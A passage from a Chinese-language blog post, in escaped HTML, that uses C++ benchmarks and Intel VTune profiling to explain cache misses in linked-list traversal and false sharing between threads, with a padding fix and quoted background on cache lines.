&lt;span class="n">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;iteration-2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">list2&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ptr&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ptr&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">*=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>并将连续内存分配和不连续分配分成&lt;code>benchmark1.cpp&lt;/code>和&lt;code>benchmark2.cpp&lt;/code>，分别用&lt;code>-m32 -O0 -g&lt;/code> 参数编译，放进 VTune 分析内存访问性能。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141503328.png"
width="507"
height="332"
srcset="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141503328_hu3571708b5c5bc5793cda86111950dfc6_32684_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141503328_hu3571708b5c5bc5793cda86111950dfc6_32684_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="benchmark1"
class="gallery-image"
data-flex-grow="152"
data-flex-basis="366px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141525825.png"
width="551"
height="340"
srcset="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141525825_hu652bea774cd469a5f99b0baeb69059e1_36904_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141525825_hu652bea774cd469a5f99b0baeb69059e1_36904_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="benchmark2"
class="gallery-image"
data-flex-grow="162"
data-flex-basis="388px"
>&lt;/p>
&lt;p>观察图中的 LLC Miss Count 可以发现，Benchmark2 的缓存未命中次数远大于 benchmark1 ，平均时延 Average Latency 高出 13 个cycles 。这如何影响性能呢？继续观察下图 Bottom-up 中的分析。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141832599.png"
width="1559"
height="121"
srcset="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141832599_huaeb1369d8df5f047d5d55e74be805100_32485_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141832599_huaeb1369d8df5f047d5d55e74be805100_32485_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="benchmark1"
class="gallery-image"
data-flex-grow="1288"
data-flex-basis="3092px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141933956.png"
width="1562"
height="91"
srcset="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141933956_hu1b3074ff876521e620d7b28b0f9399ed_27911_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215141933956_hu1b3074ff876521e620d7b28b0f9399ed_27911_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="benchmark2"
class="gallery-image"
data-flex-grow="1716"
data-flex-basis="4119px"
>&lt;/p>
&lt;p>能发现，在benchmark1（连续分配链表遍历测试）中，初始化耗时和遍历耗时相仿，都在300ms左右。初始化耗时可能主要来自缺页，每次遍历整个链表仅3ms左右，LLC Miss Count 为 0。这说明缓存完美地发挥了作用。&lt;/p>
&lt;p>在 benchmark2 （循环分配节点，不连续）中，初始化耗时1.4秒，100次遍历耗时26.461秒，而且注意，LLC Miss Count 高达 47,603,332 。将这个数字除以循环次数，大约等于每个节点访问都会产生 0.7 个 LLC Miss 。&lt;/p>
&lt;p>为什么会发生这种事？&lt;/p>
&lt;p>benchmark1 一次 new 出连续的 &lt;code>1024 * 1024 * 64&lt;/code> 个元素，每个元素 8 个字节，连续排列，而且构造链表时是按顺序头尾相连的。所以遍历 benchmark1 的链表时，填充好的 cache line (设为 64字节)一共有8个链表元素且连续，预取机制同时拿了下一个 cache line ，因此 CPU 几乎不用傻等主存给数据，只需要不断一个 cache line 接一个 cache line 读写即可，效率极高。&lt;/p>
&lt;p>而 benchmark2 相反，因为链表中的每个元素都是独立分配的，依据 allocator 算法不同表现会有区别，但比较明确的是元素不大可能是在内存中连续分配。在遍历链表时，取下一个链表元素 &lt;code>cur=cur-&amp;gt;next &lt;/code> 后，&lt;code>cur&lt;/code> 指向的地址大概率并不在已缓存的 cache line 中，因此每次循环里 CPU 都不得不从主存取数。可是主存取数是L1/L2 缓存取数耗时的成百上千倍，效率极低。&lt;/p>
&lt;h3 id="伪共享">伪共享&lt;/h3>
&lt;p>继续之前再说说伪共享。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstddef&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;thread&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;functional&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;chrono&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">chrono&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">function&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">fn&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">duration_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">milliseconds&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stop&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">10000000&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">data&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;iteration&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">d&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kr">thread&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">threads&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">t&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">threads&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">t&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>依然是一个很简单的 benchmark，输出如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">iteration: 172ms
iteration: 176ms
iteration: 181ms
iteration: 177ms
iteration: 182ms
iteration: 179ms
... 略
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个非常简单的操作，4线程无锁，无 &lt;code>volatile&lt;/code> 递增不同的四个变量，几乎看不出有什么约束导致性能低下的问题。我们通过 Intel VTune 来看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215163719690.png"
width="1453"
height="740"
srcset="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215163719690_hu046c5a587cbc915571865660d4965e46_142205_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215163719690_hu046c5a587cbc915571865660d4965e46_142205_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="false sharing - intel VTune"
class="gallery-image"
data-flex-grow="196"
data-flex-basis="471px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215163847953.png"
width="1453"
height="740"
srcset="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215163847953_hu63d8a1f13a9b918520d7739e38733940_101530_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215163847953_hu63d8a1f13a9b918520d7739e38733940_101530_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="stall"
class="gallery-image"
data-flex-grow="196"
data-flex-basis="471px"
>&lt;/p>
&lt;p>可以看到，VTune 提示CPU花费了大量时间在傻等 cache line 写入主存。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215164012789.png"
width="1101"
height="62"
srcset="https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215164012789_hua004026a68d2e492c13f4a22525e40fe_14051_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cpu-cache-page-fault-and-false-sharing/image-20220215164012789_hua004026a68d2e492c13f4a22525e40fe_14051_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="hot spot"
class="gallery-image"
data-flex-grow="1775"
data-flex-basis="4261px"
>&lt;/p>
&lt;p>函数 f 出现了海量的 loads/store 操作。&lt;/p>
&lt;p>在前文中我们聊了 cache line 的作用，这里也能看到 LLC Miss 为 0，那么为什么运行性能会这么差呢？&lt;/p>
&lt;p>这个问题还得回到 cache line 上。在多核系统中，cache line 还要求 &lt;strong>一致性&lt;/strong> ，一旦写 cache line 中的任意字节，都会让 &lt;strong>整个&lt;/strong> cache line 标记为失效。在基准测试代码里，四个 int 变量被连续分配在栈上，也就是说 cache line 极有可能将这四个变量中的多个保存在同一 cache line 内。任意一个线程修改了其中一个变量，都会导致 cache line 被标为失效，其他线程或核心想要访问这四个变量之一都不得不从主存重新取数。&lt;/p>
&lt;p>这么做的原因是为了保证数据一致性。CPU0 修改了 cache line 中的数据，还没有写回主存，其他 CPU 都不清楚 CPU0 做了什么修改，只能等待 CPU0 写回主存（或者L3），再重新从主存（或L3）取数。但我们都知道a、b、c、d并不是共享的，每个线程都只访问自己的那个变量。这种问题被称作&lt;strong>伪共享&lt;/strong>。&lt;/p>
&lt;p>在 VTune 中的表现，就是上图中海量的 Loads/Stores 操作。&lt;/p>
&lt;p>如何解决呢？&lt;/p>
&lt;p>很简单，让每个线程要操作的变量填满整个 cache line，防止因为cache line 里混入和其他线程要修改的变量造成伪共享。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int8_t&lt;/span> &lt;span class="n">_before&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">60&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="kt">int32_t&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int8_t&lt;/span> &lt;span class="n">_after&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">60&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">10000000&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">value&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;iteration&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">value&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="n">d&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
&lt;span class="kr">thread&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">threads&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">t&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">threads&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">t&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将原本的 int 改成前后各有 60 字节填充的结构（前60字节防止 value 混入别人的 cache line，后60字节防止value后的变量混入cache line，124字节，对齐后128字节）。这个解决方法是典型的 &lt;strong>用空间换时间&lt;/strong> 。再次运行基准测试，可以看到运行时间缩短了数倍。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">iteration: 15ms
iteration: 21ms
iteration: 20ms
iteration: 18ms
iteration: 20ms
iteration: 22ms
iteration: 20ms
iteration: 19ms
iteration: 20ms
iteration: 20ms
... 略
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="cache-line-原理">cache line 原理&lt;/h3>
&lt;p>Intel 在 2016 年发表的一篇文章，&lt;a class="link" href="https://www.intel.com/content/www/us/en/developer/articles/technical/how-memory-is-accessed.html" target="_blank" rel="noopener"
>How Memory Is Accessed&lt;/a>这样写道。&lt;/p>
&lt;blockquote>
&lt;p>Programming modern computers rarely requires an understanding of underlying hardware and software; consequently, most programmers do not know how the memory subsystem works.&lt;/p>
&lt;p>However, such lack of knowledge can ultimately produce a 10x or worse slowdown in application performance – especially since the arrival of &lt;a class="link" href="http://software.intel.com/en-us/articles/what-s-new-about-modern-hardware" target="_blank" rel="noopener"
>new hardware technologies&lt;/a>.&lt;/p>
&lt;p>&amp;hellip;&lt;/p>
&lt;p>The accesses propagating through the memory subsystem are a combination of a specific request and the needed physical addresses and, perhaps, data.&lt;/p>
&lt;p>Data moves around most of the memory subsystem in 64-byte quantities called &lt;em>cache lines&lt;/em>. A &lt;em>cache entry&lt;/em>, which is some transistors that can store a physical address and a cache line, is filled when a cache line is copied into it. Pages are evenly divided into cache lines – the first 64 bytes of a 4096-byte page is a cache line, with the 64 bytes stored together in a cache entry; the next 64 bytes is the next cache line, etc.&lt;/p>
&lt;p>Each cache line may:&lt;/p>
&lt;ul>
&lt;li>Not be cached&lt;/li>
&lt;li>Occupy an entry in one cache&lt;/li>
&lt;li>Be duplicated in several caches&lt;/li>
&lt;/ul>
&lt;p>Cores, I/O devices, and other devices send requests to caches to either read or write a cache entry for a physical address. The lowest six bits of the physical address are not sent – they are used by the core to select the bytes within the cache line. The core sends separate requests for each cache line it needs.&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Reads&lt;/strong> – If a cache has the requested physical address in a cache entry, the cache returns the data. If not, the cache requests the data from deeper in the memory subsystem and evicts some cache entry to make room. If the evicted cache entry has been modified, it must be written to the deeper memory subsystem as part of this eviction. This means a stream of reads may slow down because an earlier set of writes must be pushed deeper into the memory subsystem. A small queue of written data buffers the communication from the sender to the receiver.&lt;/li>
&lt;li>&lt;strong>Writes&lt;/strong> – If the cache does not have the cache line in a cache entry, the cache reads it from deeper in the memory subsystem. It evicts some other physical address from its cache entry to make room for this cache line. The read is necessary to get all the 64 bytes, because the write is probably changing only some of them. The first time a cache entry is written, the cache entries of this physical address in all other caches are invalidated. This action makes the first write on a cache entry more expensive than later writes.&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>CPU访问主存时并不是直接从主存取数，而是先读入高速缓存，也就是在CPU的规格说明中提到的 L1/L2/L3 缓存。而且，CPU也不会傻乎乎地只从主存取一个字节、4个字节或8个字节，而是取更多数据放入缓存。&lt;/p>
&lt;p>为什么？因为 &lt;em>局部性原理&lt;/em> 。CPU设计者假设程序访问一个地址，则很快也会访问这个地址附近的其他地址。&lt;/p>
&lt;p>这儿有个表格 &lt;em>Numbers everyone should know&lt;/em>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0.5 ns - CPU L1 dCACHE reference
1 ns - speed-of-light (a photon) travel a 1 ft (30.5cm) distance
5 ns - CPU L1 iCACHE Branch mispredict
7 ns - CPU L2 CACHE reference
71 ns - CPU cross-QPI/NUMA best case on XEON E5-46*
100 ns - MUTEX lock/unlock
100 ns - own DDR MEMORY reference
135 ns - CPU cross-QPI/NUMA best case on XEON E7-*
202 ns - CPU cross-QPI/NUMA worst case on XEON E7-*
325 ns - CPU cross-QPI/NUMA worst case on XEON E5-46*
10,000 ns - Compress 1K bytes with Zippy PROCESS
20,000 ns - Send 2K bytes over 1 Gbps NETWORK
250,000 ns - Read 1 MB sequentially from MEMORY
500,000 ns - Round trip within a same DataCenter
10,000,000 ns - DISK seek
10,000,000 ns - Read 1 MB sequentially from NETWORK
30,000,000 ns - Read 1 MB sequentially from DISK
150,000,000 ns - Send a NETWORK packet CA -&amp;gt; Netherlands
| | | |
| | | ns|
| | us|
| ms|
&lt;/code>&lt;/pre>&lt;/div>&lt;p>具体数字依赖于具体的硬件平台，这个表格可以对访问速度建立大概的映像。当 L1/L2 缓存未命中，CPU不得不继续向更远、延时更长的设备寻求数据，每个 LLC Miss 都意味着 CPU 不得不花上成百上千倍的时间等待填充 cache line。而 LLC Miss 出现的频率越高，则意味着 CPU 执行的效率越低——绝大部分时间都在等待主存的数据。&lt;/p>
&lt;p>更糟糕的是，有时候 CPU 真的就是傻等(stall)，不专门分析甚至都不知道程序根本没跑出应有的速度。&lt;/p>
&lt;blockquote>
&lt;p>Modern cores use both &lt;a class="link" href="https://en.wikipedia.org/wiki/Out-of-order_execution" target="_blank" rel="noopener"
>out-of-order execution&lt;/a> and &lt;a class="link" href="https://en.wikipedia.org/wiki/Hyper-threading" target="_blank" rel="noopener"
>hyperthreading&lt;/a> to find and to do something useful while other instructions wait for data to be fetched.&lt;/p>
&lt;p>If nothing useful can be done, the core stalls. Unfortunately, the OS is almost unaware of the stall: the application appears to be running, and it is hard to tell if the application is slower than it should be. You need tools to examine &lt;a class="link" href="https://en.wikipedia.org/wiki/Hardware_performance_counter" target="_blank" rel="noopener"
>hardware performance counters&lt;/a> to see stall details.&lt;/p>
&lt;/blockquote>
&lt;p>回顾基准测试代码，仅仅是连续分配内存就可以获得百倍的性能改善，超值。&lt;/p>
&lt;p>引用前文来给 cache line 小节结尾：&lt;/p>
&lt;blockquote>
